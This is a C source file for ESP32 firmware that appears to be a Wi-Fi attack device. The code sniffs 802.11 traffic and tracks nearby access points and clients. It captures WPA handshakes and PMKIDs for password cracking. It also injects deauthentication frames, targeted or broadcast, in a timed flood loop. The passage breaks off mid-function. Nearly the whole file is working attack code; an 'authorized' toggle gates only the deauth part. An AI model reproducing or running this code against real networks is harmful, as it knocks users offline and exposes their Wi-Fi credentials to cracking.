#include "pwn_wifi.h"

#include <string.h>
#include <stdio.h>
#include <stdarg.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_netif.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_heap_caps.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/ringbuf.h"
#include "freertos/semphr.h"
#include "freertos/queue.h"

#include "pwn_capture.h"

static const char *TAG = "wifi";

#define EAPOL_LLC_LEN 8
#define EAPOL_KEY_FIXED 95

typedef struct {
    uint16_t len;
    uint8_t  channel;
    int8_t   rssi;
    uint8_t  data[PWN_FRAME_MAX];
} pwn_frame_t;

static RingbufHandle_t s_rb;
static TaskHandle_t s_task;
static SemaphoreHandle_t s_tab_lock;
static SemaphoreHandle_t s_evt_lock;

static pwn_ap_t    *s_aps;
static pwn_client_t s_clients[PWN_MAX_CLIENTS];
static pwn_wifi_stats_t s_stats;
static pwn_wifi_tx_t s_last_tx;
static QueueHandle_t s_deauth_q;
static TaskHandle_t s_deauth_task;
static volatile bool s_deauth_active;

static void tx_done_cb(const esp_80211_tx_info_t *info);
static void deauth_task(void *arg);

static volatile bool s_paused;
static volatile bool s_authorized;
static volatile bool s_locked;
static volatile bool s_auto_deauth;
static volatile uint32_t s_dwell_ms = 5000;
static volatile bool s_aggressive;
static volatile uint8_t s_channels[PWN_ALL_COUNT_MAX];
static volatile uint8_t s_chan_count = PWN_2G_COUNT;
static volatile uint8_t s_chan_idx;
static volatile uint32_t s_hop_errors;

static void event(const char *fmt, ...) __attribute__((format(printf, 1, 2)));

static void event(const char *fmt, ...)
{
    char tmp[sizeof(s_stats.last_event)];
    va_list ap;
    va_start(ap, fmt);
    vsnprintf(tmp, sizeof(tmp), fmt, ap);
    va_end(ap);

    if (s_evt_lock) {
        xSemaphoreTake(s_evt_lock, portMAX_DELAY);
    }
    snprintf(s_stats.last_event, sizeof(s_stats.last_event), "%s", tmp);
    if (s_evt_lock) {
        xSemaphoreGive(s_evt_lock);
    }
}

/* ---- helpers ---------------------------------------------------------- */

static uint32_t now_ms(void)
{
    return (uint32_t)(esp_timer_get_time() / 1000);
}

static bool mac_eq(const uint8_t *a, const uint8_t *b)
{
    return memcmp(a, b, 6) == 0;
}

/* ---- AP / client tables ---------------------------------------------- */

static pwn_ap_t *ap_find(const uint8_t *bssid)
{
    for (int i = 0; i < PWN_MAX_APS; i++) {
        if (s_aps[i].last_seen_ms && mac_eq(s_aps[i].bssid, bssid)) {
            return &s_aps[i];
        }
    }
    return NULL;
}

static pwn_ap_t *ap_upsert(const uint8_t *bssid)
{
    pwn_ap_t *ap = ap_find(bssid);
    if (ap) {
        return ap;
    }
    /* Free slot first, else recycle the least recently seen. */
    pwn_ap_t *free_slot = NULL;
    pwn_ap_t *lru = NULL;
    for (int i = 0; i < PWN_MAX_APS; i++) {
        if (s_aps[i].last_seen_ms == 0) {
            free_slot = &s_aps[i];
            break;
        }
        if (!lru || s_aps[i].last_seen_ms < lru->last_seen_ms) {
            lru = &s_aps[i];
        }
    }
    ap = free_slot ? free_slot : lru;
    if (ap) {
        memset(ap, 0, sizeof(*ap));
        memcpy(ap->bssid, bssid, 6);
        s_stats.ap_count++;
    }
    return ap;
}

static pwn_client_t *client_upsert(const uint8_t *mac, const uint8_t *bssid)
{
    for (int i = 0; i < PWN_MAX_CLIENTS; i++) {
        if (s_clients[i].last_seen_ms && mac_eq(s_clients[i].mac, mac)) {
            if (bssid && !s_clients[i].bssid[0] && !s_clients[i].bssid[1]) {
                memcpy(s_clients[i].bssid, bssid, 6);
            }
            return &s_clients[i];
        }
    }
    pwn_client_t *free_slot = NULL;
    pwn_client_t *lru = NULL;
    for (int i = 0; i < PWN_MAX_CLIENTS; i++) {
        if (s_clients[i].last_seen_ms == 0) {
            free_slot = &s_clients[i];
            break;
        }
        if (!lru || s_clients[i].last_seen_ms < lru->last_seen_ms) {
            lru = &s_clients[i];
        }
    }
    pwn_client_t *c = free_slot ? free_slot : lru;
    if (c) {
        memset(c, 0, sizeof(*c));
        memcpy(c->mac, mac, 6);
        if (bssid) {
            memcpy(c->bssid, bssid, 6);
        }
        s_stats.client_count++;
    }
    return c;
}

static const char *ap_ssid_for(const uint8_t *bssid, char out[33])
{
    pwn_ap_t *ap = ap_find(bssid);
    if (ap && ap->ssid[0]) {
        snprintf(out, 33, "%s", ap->ssid);
        return out;
    }
    snprintf(out, 33, "%02x%02x%02x%02x%02x%02x",
             bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
    return out;
}

/* ---- 802.11 parsing --------------------------------------------------- */

static uint8_t parse_security(const uint8_t *ies, int len)
{
    bool rsn = false, wpa = false, sae = false, privacy = false;
    int i = 0;
    while (i + 2 <= len) {
        uint8_t id = ies[i];
        uint8_t elen = ies[i + 1];
        if (i + 2 + elen > len) {
            break;
        }
        const uint8_t *el = &ies[i + 2];
        if (id == 48) { /* RSN */
            rsn = true;
            /* AKM suite list: scan for 00:0F:AC:08 (SAE). */
            for (int k = 0; k + 4 <= elen; k++) {
                if (el[k] == 0x00 && el[k + 1] == 0x0f &&
                    el[k + 2] == 0xac && el[k + 3] == 0x08) {
                    sae = true;
                }
            }
        } else if (id == 221 && elen >= 4) {
            if (el[0] == 0x00 && el[1] == 0x50 && el[2] == 0xf2 && el[3] == 0x01) {
                wpa = true;
            }
        }
        i += 2 + elen;
    }

    /* Capability privacy bit is passed separately by the caller in ies[-?];
     * handled by the caller setting SEC_* from the auth fields. */
    (void)privacy;
    if (sae)           return SEC_WPA3;
    if (rsn)           return SEC_WPA2;
    if (wpa)           return SEC_WPA;
    return SEC_UNKNOWN;
}

static bool ies_find_ssid(const uint8_t *ies, int len, char out[33])
{
    int i = 0;
    while (i + 2 <= len) {
        uint8_t id = ies[i];
        uint8_t elen = ies[i + 1];
        if (i + 2 + elen > len) {
            break;
        }
        if (id == 0) {
            int n = elen > 32 ? 32 : elen;
            memcpy(out, &ies[i + 2], n);
            out[n] = 0;
            return n > 0;
        }
        i += 2 + elen;
    }
    out[0] = 0;
    return false;
}

static uint8_t ies_find_ds(const uint8_t *ies, int len)
{
    int i = 0;
    while (i + 2 <= len) {
        uint8_t id = ies[i];
        uint8_t elen = ies[i + 1];
        if (i + 2 + elen > len) {
            break;
        }
        if (id == 3 && elen >= 1) {
            return ies[i + 2];
        }
        i += 2 + elen;
    }
    return 0;
}

static bool ies_has_wps(const uint8_t *ies, int len)
{
    int i = 0;
    while (i + 2 <= len) {
        uint8_t id = ies[i];
        uint8_t elen = ies[i + 1];
        if (i + 2 + elen > len) {
            break;
        }
        if (id == 221 && elen >= 4 && ies[i + 2] == 0x00 &&
            ies[i + 3] == 0x50 && ies[i + 4] == 0xf2 && ies[i + 5] == 0x04) {
            return true;
        }
        i += 2 + elen;
    }
    return false;
}

/* RSN capabilities: MFPC (0x80) / MFPR (0x40). */
static bool ies_rsn_pmf(const uint8_t *ies, int len)
{
    int i = 0;
    while (i + 2 <= len) {
        uint8_t id = ies[i];
        uint8_t elen = ies[i + 1];
        if (i + 2 + elen > len) {
            break;
        }
        if (id == 48 && elen >= 8) {
            const uint8_t *r = &ies[i + 2];
            int n = elen;
            int off = 2; /* version */
            if (off + 4 > n) return false;
            off += 4;    /* group cipher */
            if (off + 2 > n) return false;
            int pc = r[off] | (r[off + 1] << 8);
            off += 2 + 4 * pc;
            if (off + 2 > n) return false;
            int ac = r[off] | (r[off + 1] << 8);
            off += 2 + 4 * ac;
            if (off + 2 > n) return false;
            uint16_t caps = (uint16_t)(r[off] | (r[off + 1] << 8));
            return (caps & 0x00c0) != 0;
        }
        i += 2 + elen;
    }
    return false;
}

static void handle_beacon(const uint8_t *p, int len, int8_t rssi, uint8_t phy_ch)
{
    if (len < 36) {
        return;
    }
    const uint8_t *bssid = p + 16;   /* addr3 */
    uint16_t cap = p[34] | (p[35] << 8);
    const uint8_t *ies = p + 36;
    int ielen = len - 36;

    char ssid[33] = {0};
    bool hidden = !ies_find_ssid(ies, ielen, ssid);
    uint8_t ds = ies_find_ds(ies, ielen);
    uint8_t sec = parse_security(ies, ielen);
    if (sec == SEC_UNKNOWN) {
        sec = (cap & 0x0010) ? SEC_WEP : SEC_OPEN;
    }
    bool wps = ies_has_wps(ies, ielen);
    bool pmf = (sec == SEC_WPA3) || ies_rsn_pmf(ies, ielen);

    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    pwn_ap_t *ap = ap_upsert(bssid);
    if (ap) {
        ap->rssi = rssi;
        ap->last_seen_ms = now_ms();
        ap->beacons++;
        ap->security = sec;
        ap->wps = wps;
        ap->hidden = hidden;
        ap->pmf = pmf;
        if (len <= PWN_BCN_MAX) {
            memcpy(ap->bcn, p, len);
            ap->bcn_len = (uint16_t)len;
        }
        if (!hidden) {
            snprintf(ap->ssid, sizeof(ap->ssid), "%s", ssid);
        }
        if (ds) {
            ap->channel = ds;
        } else if (phy_ch && phy_ch < 16) {
            ap->channel = phy_ch;
        }
        if (ap->ssid[0]) {
            snprintf(s_stats.last_ssid, sizeof(s_stats.last_ssid), "%s", ap->ssid);
        }
    }
    xSemaphoreGive(s_tab_lock);

    s_stats.beacons++;
}

static void handle_probe_req(const uint8_t *p, int len, int8_t rssi)
{
    if (len < 24) {
        return;
    }
    const uint8_t *sta = p + 10;  /* addr2 */
    char ssid[33] = {0};
    if (len > 24) {
        ies_find_ssid(p + 24, len - 24, ssid);
    }
    s_stats.probes++;

    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    pwn_client_t *c = (sta[0] & 0x01) == 0 ? client_upsert(sta, NULL) : NULL;
    if (c) {
        c->rssi = rssi;
        c->frames++;
        c->last_seen_ms = now_ms();
    }
    xSemaphoreGive(s_tab_lock);

    if (ssid[0]) {
        event("probe %s from %02x:%02x:%02x:%02x:%02x:%02x", ssid,
              sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);
    }
}

static void handle_eapol(const uint8_t *p, int len, int hdr_len, int8_t rssi)
{
    const uint8_t *llc = p + hdr_len;
    if (len < hdr_len + EAPOL_LLC_LEN + 4) {
        return;
    }
    if (llc[0] != 0xaa || llc[1] != 0xaa || llc[2] != 0x03 ||
        llc[6] != 0x88 || llc[7] != 0x8e) {
        return;
    }

    const uint8_t *eapol = llc + EAPOL_LLC_LEN;
    int elen = len - (hdr_len + EAPOL_LLC_LEN);
    if (elen < 4 + EAPOL_KEY_FIXED) {
        return;
    }
    if (eapol[1] != 0x03) { /* EAPOL-Key */
        return;
    }

    const uint8_t *body = eapol + 4;
    if (body[0] != 0x02 && body[0] != 0xfe) { /* RSN / WPA key descriptor */
        return;
    }
    uint16_t key_info = (uint16_t)((body[1] << 8) | body[2]);
    if (!(key_info & 0x0008)) { /* group key, ignore */
        return;
    }

    bool ack = key_info & 0x0080;
    bool mic = key_info & 0x0100;
    bool install = key_info & 0x0040;
    bool secure = key_info & 0x0200;

    uint8_t msg = 0;
    if (ack && !mic)                         msg = 1;
    else if (!ack && mic && !secure)         msg = 2;
    else if (ack && mic && install)          msg = 3;
    else if (!ack && mic && secure)          msg = 4;
    if (!msg) {
        return;
    }

    uint16_t kd_len = (uint16_t)((body[93] << 8) | body[94]);
    const uint8_t *kd = body + EAPOL_KEY_FIXED;
    if ((int)kd_len > elen - (4 + EAPOL_KEY_FIXED)) {
        kd_len = (uint16_t)(elen - (4 + EAPOL_KEY_FIXED));
    }

    const uint8_t *pmkid = NULL;
    int i = 0;
    while (i + 2 <= (int)kd_len) {
        uint8_t id = kd[i];
        uint8_t klen = kd[i + 1];
        if (i + 2 + klen > (int)kd_len) {
            break;
        }
        if (id == 0xdd && klen >= 4 + 16 &&
            kd[i + 2] == 0x00 && kd[i + 3] == 0x0f &&
            kd[i + 4] == 0xac && kd[i + 5] == 0x04) {
            pmkid = &kd[i + 6];
            break;
        }
        i += 2 + klen;
    }

    const uint8_t *bssid;
    const uint8_t *sta;
    bool tods = p[1] & 0x01;
    bool fromds = p[1] & 0x02;
    if (tods) {
        bssid = p + 4;   /* addr1 */
        sta = p + 10;    /* addr2 */
    } else if (fromds) {
        bssid = p + 10;  /* addr2 */
        sta = p + 4;     /* addr1 */
    } else {
        return;
    }

    char ssid[33];
    uint8_t ctx_bcn[PWN_BCN_MAX];
    uint16_t ctx_bcn_len = 0;
    uint8_t ctx_ch = (uint8_t)s_stats.channel;
    int8_t ctx_rssi = rssi;
    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    ap_ssid_for(bssid, ssid);
    pwn_ap_t *ap = ap_find(bssid);
    if (ap) {
        if (ap->channel) {
            ctx_ch = ap->channel;
        }
        ctx_rssi = ap->rssi;
        if (ap->bcn_len && ap->bcn_len <= PWN_BCN_MAX) {
            ctx_bcn_len = ap->bcn_len;
            memcpy(ctx_bcn, ap->bcn, ctx_bcn_len);
        }
        if (pmkid) {
            ap->has_handshake = true;
        }
    }
    xSemaphoreGive(s_tab_lock);

    s_stats.eapol++;
    capture_add_eapol(bssid, sta, ssid, msg, p, (uint16_t)len, pmkid,
                      ctx_ch, ctx_rssi, ctx_bcn, ctx_bcn_len);

    event("EAPOL M%u %s %02x:%02x:%02x:%02x:%02x:%02x", msg, ssid,
          sta[0], sta[1], sta[2], sta[3], sta[4], sta[5]);

    if (pmkid) {
        event("PMKID leaked by %s (M%u)", ssid, msg);
    }

    (void)rssi;
}

static void handle_data(const uint8_t *p, int len, int8_t rssi)
{
    if (len < 24) {
        return;
    }
    uint8_t sub = (p[0] >> 4) & 0x0f;
    int hdr = 24;
    if (sub & 0x08) {
        hdr += 2; /* QoS control */
    }
    if (p[1] & 0x80) {
        hdr += 4; /* HT control */
    }
    if (len < hdr + 8) {
        return;
    }

    bool tods = p[1] & 0x01;
    bool fromds = p[1] & 0x02;
    const uint8_t *bssid = NULL;
    const uint8_t *sta = NULL;
    if (tods) {
        bssid = p + 4;
        sta = p + 10;
    } else if (fromds) {
        bssid = p + 10;
        sta = p + 4;
    }

    if (sta && bssid && (sta[0] & 0x01) == 0) {
        xSemaphoreTake(s_tab_lock, portMAX_DELAY);
        pwn_client_t *c = client_upsert(sta, bssid);
        if (c) {
            c->rssi = rssi;
            c->frames++;
            c->last_seen_ms = now_ms();
        }
        xSemaphoreGive(s_tab_lock);
    }

    handle_eapol(p, len, hdr, rssi);
}

static void process_frame(const uint8_t *p, int len, int8_t rssi, uint8_t phy_ch)
{
    if (len < 24) {
        return;
    }
    s_stats.frames++;
    s_stats.last_rssi = rssi;

    uint8_t type = (p[0] >> 2) & 0x03;
    uint8_t sub = (p[0] >> 4) & 0x0f;

    if (type == 0) { /* management */
        s_stats.mgmt++;
        if (sub == 8 || sub == 5) {        /* beacon / probe response */
            handle_beacon(p, len, rssi, phy_ch);
        } else if (sub == 4) {             /* probe request */
            handle_probe_req(p, len, rssi);
        } else if (sub == 12 || sub == 10) { /* deauth / disassoc */
            if (sub == 12) s_stats.deauths++;
            else           s_stats.disassoc++;
            event("%s from %02x:%02x:%02x:%02x:%02x:%02x",
                  sub == 12 ? "deauth" : "disassoc",
                  p[10], p[11], p[12], p[13], p[14], p[15]);
        }
    } else if (type == 2) { /* data */
        s_stats.data++;
        handle_data(p, len, rssi);
    }
}

/* ---- sniffer plumbing ------------------------------------------------- */

static void sniff_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len <= 0 || len > (int)sizeof(((pwn_frame_t *)0)->data)) {
        len = len > (int)sizeof(((pwn_frame_t *)0)->data)
                  ? (int)sizeof(((pwn_frame_t *)0)->data) : len;
        if (len <= 0) {
            s_stats.dropped++;
            return;
        }
    }

    static pwn_frame_t item; /* callback runs only in the WiFi task */
    item.len = (uint16_t)len;
    item.channel = (uint8_t)pkt->rx_ctrl.channel;
    item.rssi = (int8_t)pkt->rx_ctrl.rssi;
    memcpy(item.data, pkt->payload, len);

    if (xRingbufferSend(s_rb, &item, sizeof(item), 0) != pdTRUE) {
        s_stats.dropped++;
    }
}

static void hop_next(void)
{
    uint8_t n = s_chan_count;
    if (n == 0) {
        return;
    }
    uint8_t idx = s_chan_idx % n;
    uint8_t ch = s_channels[idx];
    s_chan_idx = (uint8_t)(idx + 1);

    esp_err_t err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        /* Some 5 GHz channels need an explicit band switch first. */
        esp_wifi_set_band(ch >= 36 ? WIFI_BAND_5G : WIFI_BAND_2G);
        err = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
    }
    if (err == ESP_OK) {
        s_stats.channel = ch;
        s_stats.band = ch >= 36 ? 5 : 2;
        s_stats.hops++;
        ESP_LOGI(TAG, "hop -> %uch (%s)", ch, ch >= 36 ? "5G" : "2.4G");
    } else {
        s_hop_errors++;
        if (s_hop_errors < 4) {
            ESP_LOGW(TAG, "channel %u switch failed: %s", ch, esp_err_to_name(err));
        }
    }
}

static void recon_task(void *arg)
{
    (void)arg;
    uint32_t last_hop = now_ms();
    uint32_t last_stat = last_hop;

    for (;;) {
        size_t sz = 0;
        pwn_frame_t *f = (pwn_frame_t *)xRingbufferReceive(s_rb, &sz,
                                                           pdMS_TO_TICKS(20));
        if (f && sz == sizeof(*f)) {
            process_frame(f->data, f->len, f->rssi, f->channel);
            vRingbufferReturnItem(s_rb, f);
        }

        uint32_t now = now_ms();
        if (s_paused) {
            last_hop = now;
        } else if (!s_locked && now - last_hop >= s_dwell_ms) {
            hop_next();
            last_hop = now;
        }

        if (now - last_stat >= 1000) {
            s_stats.hs_count = capture_handshake_count();
            s_stats.pmkid_count = capture_pmkid_count();
            s_stats.saved_count = capture_saved_count();
            s_stats.sd_ready = capture_sd_ready();
            last_stat = now;
        }

        vTaskDelay(0);
    }
}

/* ---- public API ------------------------------------------------------- */

esp_err_t pwn_wifi_start(void)
{
    s_tab_lock = xSemaphoreCreateMutex();
    s_evt_lock = xSemaphoreCreateMutex();
    memset(&s_stats, 0, sizeof(s_stats));
    strcpy(s_stats.last_event, "booting");

    s_aps = heap_caps_calloc(PWN_MAX_APS, sizeof(pwn_ap_t),
                             MALLOC_CAP_SPIRAM);
    if (!s_aps) {
        s_aps = calloc(PWN_MAX_APS, sizeof(pwn_ap_t));
    }
    if (!s_aps) {
        ESP_LOGE(TAG, "AP table allocation failed");
        return ESP_ERR_NO_MEM;
    }

    s_rb = xRingbufferCreate(PWN_RB_BYTES, RINGBUF_TYPE_NOSPLIT);
    if (!s_rb) {
        ESP_LOGE(TAG, "ring buffer alloc failed");
        return ESP_ERR_NO_MEM;
    }

    ESP_ERROR_CHECK(esp_netif_init());
    ESP_ERROR_CHECK(esp_event_loop_create_default());
    esp_netif_create_default_wifi_sta();

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_start());

    esp_err_t txcb_err = esp_wifi_register_80211_tx_cb(tx_done_cb);
    if (txcb_err != ESP_OK) {
        ESP_LOGW(TAG, "80211 tx callback unavailable: %s", esp_err_to_name(txcb_err));
    }

    esp_err_t err = esp_wifi_set_band_mode(WIFI_BAND_MODE_AUTO);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "band mode AUTO not available: %s (2.4 GHz only)",
                 esp_err_to_name(err));
    }

    err = esp_wifi_set_country_code(PWN_COUNTRY, false);
    if (err != ESP_OK) {
        ESP_LOGW(TAG, "country code %s rejected: %s", PWN_COUNTRY,
                 esp_err_to_name(err));
    }

    esp_wifi_set_ps(WIFI_PS_NONE);

    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA,
    };
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_rx_cb(sniff_cb));
    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));

    /* Start on channel 1 with the default 2.4 GHz plan. */
    for (int i = 0; i < PWN_2G_COUNT; i++) {
        s_channels[i] = (uint8_t)(i + 1);
    }
    s_chan_count = PWN_2G_COUNT;
    esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
    s_stats.channel = 1;
    s_stats.band = 2;

    xTaskCreatePinnedToCore(recon_task, "pwn_recon", 8192, NULL, 5, &s_task, 0);

    s_deauth_q = xQueueCreate(1, sizeof(pwn_deauth_job_t));
    if (s_deauth_q) {
        if (xTaskCreate(deauth_task, "pwn_deauth", 4096, NULL, 4,
                        &s_deauth_task) != pdPASS) {
            ESP_LOGW(TAG, "deauth task create failed");
            s_deauth_task = NULL;
        }
    } else {
        ESP_LOGW(TAG, "deauth queue create failed");
    }

    ESP_LOGI(TAG, "sniffer up: band=AUTO dwell=%ums plan=%uch",
             (unsigned)s_dwell_ms, s_chan_count);
    event("sniffer up");
    return ESP_OK;
}

void pwn_wifi_stop(void)
{
    esp_wifi_set_promiscuous(false);
    if (s_deauth_task) {
        vTaskDelete(s_deauth_task);
        s_deauth_task = NULL;
    }
    if (s_deauth_q) {
        vQueueDelete(s_deauth_q);
        s_deauth_q = NULL;
    }
    s_deauth_active = false;
    if (s_task) {
        vTaskDelete(s_task);
        s_task = NULL;
    }
    esp_wifi_stop();
    if (s_rb) {
        vRingbufferDelete(s_rb);
        s_rb = NULL;
    }
}

void pwn_wifi_apply_policy(const brain_policy_t *p, bool authorized)
{
    if (!p) {
        return;
    }
    s_authorized = authorized && PWN_ENABLE_DEAUTH;
    s_aggressive = p->aggressive && s_authorized;

    uint8_t n = p->channel_count;
    if (n > PWN_ALL_COUNT_MAX) {
        n = PWN_ALL_COUNT_MAX;
    }
    if (n == 0) {
        return;
    }
    for (int i = 0; i < n; i++) {
        s_channels[i] = p->channels[i];
    }
    s_chan_count = n;
    s_chan_idx = 0;
    s_dwell_ms = p->dwell_ms;

    ESP_LOGI(TAG, "policy %s: %uch, dwell %ums%s", p->name, n,
             (unsigned)p->dwell_ms, s_aggressive ? ", aggressive" : "");
}

void pwn_wifi_set_paused(bool paused)
{
    s_paused = paused;
    event(paused ? "paused" : "resumed");
}

bool pwn_wifi_paused(void)
{
    return s_paused;
}

void pwn_wifi_set_authorized(bool on)
{
    s_authorized = on && PWN_ENABLE_DEAUTH;
    if (!s_authorized) {
        s_auto_deauth = false;
        pwn_wifi_deauth_stop();
    }
    s_stats.authorized = s_authorized;
    ESP_LOGW(TAG, "active attacks %s", s_authorized ? "ENABLED" : "disabled");
}

bool pwn_wifi_authorized(void)
{
    return s_authorized;
}

esp_err_t pwn_wifi_deauth(const uint8_t *bssid, const uint8_t *sta, uint8_t reason)
{
    if (!s_authorized) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!bssid || !sta) {
        return ESP_ERR_INVALID_ARG;
    }

    uint8_t frame[26] = {
        0xc0, 0x00,             /* deauth */
        0x00, 0x00,             /* duration */
    };
    memcpy(&frame[4], sta, 6);
    memcpy(&frame[10], bssid, 6);
    memcpy(&frame[16], bssid, 6);
    frame[22] = 0;
    frame[23] = 0;
    frame[24] = reason;
    frame[25] = 0;

    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
    if (err == ESP_OK) {
        s_stats.deauths++;
    } else {
        ESP_LOGW(TAG, "deauth tx failed: %s", esp_err_to_name(err));
    }
    return err;
}

static void tx_done_cb(const esp_80211_tx_info_t *info)
{
    if (!info) {
        return;
    }
    s_last_tx.valid = true;
    if (info->src_addr) {
        memcpy(s_last_tx.src, info->src_addr, 6);
    }
    if (info->des_addr) {
        memcpy(s_last_tx.dst, info->des_addr, 6);
    }
    s_last_tx.len = info->data_len;
    s_last_tx.status = (int)info->tx_status;
    int total = 24 + info->data_len;
    if (total > (int)sizeof(s_last_tx.raw)) {
        total = (int)sizeof(s_last_tx.raw);
    }
    if (info->data && total > 0) {
        memcpy(s_last_tx.raw, info->data, total);
        s_last_tx.raw_len = (uint8_t)total;
    }
    ESP_LOGD(TAG, "raw tx status=%d src=%02x:%02x:%02x:%02x:%02x:%02x "
                  "dst=%02x:%02x:%02x:%02x:%02x:%02x len=%u",
             (int)info->tx_status,
             s_last_tx.src[0], s_last_tx.src[1], s_last_tx.src[2],
             s_last_tx.src[3], s_last_tx.src[4], s_last_tx.src[5],
             s_last_tx.dst[0], s_last_tx.dst[1], s_last_tx.dst[2],
             s_last_tx.dst[3], s_last_tx.dst[4], s_last_tx.dst[5],
             (unsigned)s_last_tx.len);
}

void pwn_wifi_self_mac(uint8_t out[6])
{
    if (!out) {
        return;
    }
    if (esp_wifi_get_mac(WIFI_IF_STA, out) != ESP_OK) {
        memset(out, 0, 6);
    }
}

void pwn_wifi_last_tx(pwn_wifi_tx_t *out)
{
    if (out) {
        *out = s_last_tx;
    }
}

void pwn_wifi_clear_last_tx(void)
{
    memset(&s_last_tx, 0, sizeof(s_last_tx));
}

const pwn_wifi_stats_t *pwn_wifi_stats(void)
{
    return &s_stats;
}

int pwn_wifi_ap_snapshot(pwn_ap_t *out, int max)
{
    if (!out || max <= 0 || !s_tab_lock) {
        return 0;
    }
    int n = 0;
    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    for (int i = 0; i < PWN_MAX_APS && n < max; i++) {
        if (s_aps[i].last_seen_ms) {
            out[n++] = s_aps[i];
        }
    }
    xSemaphoreGive(s_tab_lock);
    return n;
}

bool pwn_wifi_ap_get(const uint8_t *bssid, pwn_ap_t *out)
{
    if (!bssid || !out || !s_tab_lock) {
        return false;
    }
    bool found = false;
    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    for (int i = 0; i < PWN_MAX_APS; i++) {
        if (s_aps[i].last_seen_ms &&
            memcmp(s_aps[i].bssid, bssid, 6) == 0) {
            *out = s_aps[i];
            found = true;
            break;
        }
    }
    xSemaphoreGive(s_tab_lock);
    return found;
}

int pwn_wifi_client_snapshot(pwn_client_t *out, int max)
{
    if (!out || max <= 0 || !s_tab_lock) {
        return 0;
    }
    int n = 0;
    xSemaphoreTake(s_tab_lock, portMAX_DELAY);
    for (int i = 0; i < PWN_MAX_CLIENTS && n < max; i++) {
        if (s_clients[i].last_seen_ms) {
            out[n++] = s_clients[i];
        }
    }
    xSemaphoreGive(s_tab_lock);
    return n;
}

static void deauth_round(const pwn_deauth_job_t *job)
{
    if (!job || !s_authorized) {
        return;
    }
    const uint8_t bcast[6] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    if (job->have_sta) {
        pwn_wifi_deauth(job->bssid, job->sta, job->reason);
        return;
    }
    if (!job->all) {
        pwn_wifi_deauth(job->bssid, bcast, job->reason);
        return;
    }

    pwn_client_t cl[PWN_MAX_CLIENTS];
    int cn = pwn_wifi_client_snapshot(cl, PWN_MAX_CLIENTS);
    uint8_t self[6];
    pwn_wifi_self_mac(self);
    int targets = 0;
    for (int i = 0; i < cn; i++) {
        if (memcmp(cl[i].bssid, job->bssid, 6) != 0) {
            continue;
        }
        if (memcmp(cl[i].mac, self, 6) == 0) {
            continue;   /* never deauth our own station */
        }
        targets++;
        pwn_wifi_deauth(job->bssid, cl[i].mac, job->reason);
    }
    if (targets == 0 && !job->target_is_self_ap) {
        pwn_wifi_deauth(job->bssid, bcast, job->reason);
    }
}

static void deauth_task(void *arg)
{
    (void)arg;
    pwn_deauth_job_t job;
    for (;;) {
        if (xQueueReceive(s_deauth_q, &job, portMAX_DELAY) != pdTRUE) {
            continue;
        }
        if (job.duration_ms == 0) {
            s_deauth_active = false;
            continue;
        }
        s_deauth_active = true;
        TickType_t end = xTaskGetTickCount() + pdMS_TO_TICKS(job.duration_ms);
        while (xTaskGetTickCount() < end && s_authorized) {
            deauth_round(&job);
            pwn_deauth_job_t next;
            if (xQueueReceive(s_deauth_q, &next,
                              pdMS_TO_TICKS(job.interval_ms)) == pdTRUE) {
                if (next.duration_ms == 0) {
                    break;
                }
                job = next;
                end = xTaskGetTickCount() + pdMS_TO_TICKS(job.duration_ms);
            }
        }
        s_deauth_active = false;
    }
}

esp_err_t pwn_wifi_deauth_start(const pwn_deauth_job_t *job)
{
    if (!job || !s_deauth_q) {
        return ESP_ERR_INVALID_STATE;
    }
    if (!s_authorized) {
        return ESP_ERR_INVALID_STATE;
    }
    if (job->duration_ms == 0) {
        return ESP_ERR_INVALID_ARG;
    }
    pwn_deauth_job_t j = *job;
    if (j.interval_ms < 20) {
        j.interval_ms = 20;
    }
    if (j.interval_ms > 1000) {
        j.interval_ms = 1000;
    }
    if (j.duration_ms > 60000) {
        j.duration_ms = 60000;
    }
    if (j.reason < 1 || j.reason > 9) {
        j.reason = 1;
    }
    if (xQueueOverwrite(s_deauth_q, &j) != pdTRUE) {
        return ESP_FAIL;
    }
    return ESP_OK;
}

void pwn_wifi_deauth_stop(void)
{
    if (s_deauth_q) {
        pwn_deauth_job_t stop = {0};
        xQueueOverwrite(s_deauth_q, &stop);
    }
}

bool pwn_wifi_deauth_active(void)
{
    return s_deauth_active;
}

esp_err_t pwn_wifi_force_channel(uint8_t channel)
{
    esp_err_t err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    if (err != ESP_OK) {
        esp_wifi_set_band(channel >= 36 ? WIFI_BAND_5G : WIFI_BAND_2G);
        err = esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    }
    if (err == ESP_OK) {
        s_channels[0] = channel;
        s_chan_count = 1;
        s_chan_idx = 0;
